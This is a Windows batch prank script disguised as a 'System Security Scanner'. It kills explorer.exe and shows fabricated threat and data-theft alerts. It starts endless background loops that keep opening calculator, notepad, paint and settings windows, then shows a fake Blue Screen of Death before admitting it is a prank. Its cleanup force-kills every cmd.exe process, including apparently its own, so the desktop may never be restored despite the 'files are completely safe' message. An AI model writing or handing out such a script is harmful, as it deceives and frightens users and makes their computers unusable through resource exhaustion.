@echo off
title System Security Scanner
color 0a
mode con: cols=80 lines=25

echo Initializing system security protocols...
timeout /t 2 >nul

:: Kill explorer.exe for dramatic effect
taskkill /f /im explorer.exe >nul 2>&1

color 2
pause

echo [WARNING] Multiple threats detected in system memory!
timeout /t 2 >nul
echo [ALERT] Firewall breach confirmed!
timeout /t 2 >nul
echo [CRITICAL] System32 corruption detected!
pause

echo.
echo Attempting emergency system recovery...
timeout /t 3 >nul
echo [FAILED] Recovery unsuccessful!
timeout /t 2 >nul
echo [FATAL] Critical system files compromised!
pause

echo.
echo Malware signatures found:
echo - Trojan.Generic.45XX
echo - Worm.Win32.AutoRun
echo - Rootkit.Boot.Master
timeout /t 3 >nul

echo.
echo Initiating deep system scan...
for /l %%i in (1,1,20) do (
    echo Scanning directory %%i/20...
    dir /s >nul 2>&1
    timeout /t 1 >nul
)

echo.
echo [ERROR] System integrity compromised beyond repair!
pause

:: Start the infinite calculator spam in background
start /min cmd /c ":main
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
start calc.exe
goto main"

:: Start other programs spamming
start /min cmd /c "for /l %%i in () do start ms-settings:"
start /min cmd /c "for /l %%i in () do start notepad"
start /min cmd /c "for /l %%i in () do start mspaint"

:: Windows pop-up messages
msg * "CRITICAL ERROR: System files corrupted!"
timeout /t 2 >nul
msg * "Multiple viruses detected!"
timeout /t 2 >nul
msg * "Windows will restart in 60 seconds!"
timeout /t 2 >nul
msg * "Your personal data is being stolen!"
timeout /t 2 >nul

:: Fake Blue Screen of Death
color 17
cls
echo.
echo A problem has been detected and Windows has been shut down to prevent damage
echo to your computer.
echo.
echo IRQL_NOT_LESS_OR_EQUAL
echo.
echo If this is the first time you've seen this stop error screen,
echo restart your computer. If this screen appears again, follow
echo these steps:
echo.
echo Check to be sure any new hardware or software is properly installed.
echo If this is a new installation, ask your hardware or software manufacturer
echo for any Windows updates you might need.
echo.
echo Technical information:
echo.
echo *** STOP: 0x0000000A (0x00000004, 0x00000002, 0x00000001, 0x804F9D9A)
echo.
echo *** Memory dump complete...
timeout /t 5 >nul

:: Black screen effect
color 0
cls
echo.
timeout /t 10 >nul

:: Reveal it's a prank
color 2
cls
echo This was just a harmless prank script!
echo No actual damage was done to your system.
echo.
echo Your files are completely safe :)
echo.
echo Closing all opened windows...
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im SystemSettings.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1

echo Restarting explorer.exe...
timeout /t 3 >nul
start explorer.exe

echo All done! Have a great day!
pause >nul
exit
